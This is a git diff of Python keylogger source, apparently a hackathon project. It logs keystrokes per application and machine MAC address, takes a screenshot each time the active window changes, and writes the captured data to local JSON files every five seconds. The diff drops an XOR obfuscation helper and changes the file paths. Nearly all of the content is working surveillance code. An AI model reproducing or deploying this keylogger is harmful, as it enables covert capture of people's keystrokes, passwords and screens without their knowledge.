@@ -6,21 +6,6 @@ import  json
 from getmac import get_mac_address
 import win32gui
 from PIL import ImageGrab
-from abc import ABC, abstractmethod
-
-class IWriter(ABC):
-    @abstractmethod
-    def write(self, data):
-        pass
-
-class Encryptor:
-    @staticmethod
-    def xor_encryption(text):
-        key = "a"
-        encrypted_text = ""
-        for i in range(len(text)):
-            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
-        return encrypted_text
 
 
 class KeyloggerService:
@@ -57,7 +42,7 @@ class KeyloggerService:
     def current_screenshot(self):
         if [self.prev_up] != [self.current_app]:
             screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+            path = rF"C:\Users\inon1\PycharmProjects\data_picture\-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
             screen_shot.save(path)
             self.prev_up = self.current_app
 
@@ -95,50 +80,11 @@ class KeyloggerService:
     def __exit__(self, exc_type, exc_val, exc_tb):
         return 1
 
-
-import json
-import os
-
-
-# class FileWriter:
-#     @staticmethod
-#     def write_to_file(data: dict):
-#         file_path = r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json"
-#
-#         # אם הקובץ קיים, טען את הנתונים הקיימים
-#         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-#             with open(file_path, "r", encoding="utf-8") as file:
-#                 try:
-#                     existing_data = json.load(file)
-#                 except json.JSONDecodeError:
-#                     existing_data = {}  # אם יש שגיאה, התחל עם מילון ריק
-#         else:
-#             existing_data = {}
-#
-#         # מיזוג הנתונים החדשים עם הישנים
-#         for mac, timestamps in data.items():
-#             if mac not in existing_data:
-#                 existing_data[mac] = {}
-#             for timestamp, logs in timestamps.items():
-#                 if timestamp not in existing_data[mac]:
-#                     existing_data[mac][timestamp] = {}
-#                 for app, keys in logs.items():
-#                     if app not in existing_data[mac][timestamp]:
-#                         existing_data[mac][timestamp][app] = []
-#                     existing_data[mac][timestamp][app].extend(keys)
-#
-#         # כתיבת הנתונים המעודכנים לקובץ
-#         with open(file_path, "w", encoding="utf-8") as file:
-#             json.dump(existing_data, file, indent=4, ensure_ascii=False)
-
-
-
-class FileWriter(IWriter):
-
-    def write(self, data):
-        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
-            if data:
-                json.dump(data , file ,ensure_ascii=False,  indent=4)
+class FileWriter:
+    @staticmethod
+    def write_to_file(data:dict):
+        with open(r"C:\Users\inon1\PycharmProjects\data_json\data_json.json" , "w" , encoding="utf-8") as file:
+            json.dump(data , file ,ensure_ascii=False)
 
 
 class KeyLoggerManager:
@@ -150,12 +96,11 @@ class KeyLoggerManager:
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter().write(self.instance.get_data())
+        FileWriter.write_to_file(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
         while True:
-            print(self.instance.current_app == self.instance.prev_up)
             self.instance.current_screenshot()
             threading.Thread(target=self.write_to_file).start()
             time.sleep(5)
@@ -163,6 +108,8 @@ print(get_mac_address())
 
 A = KeyLoggerManager()
 A.main()
+
+
 
 
 
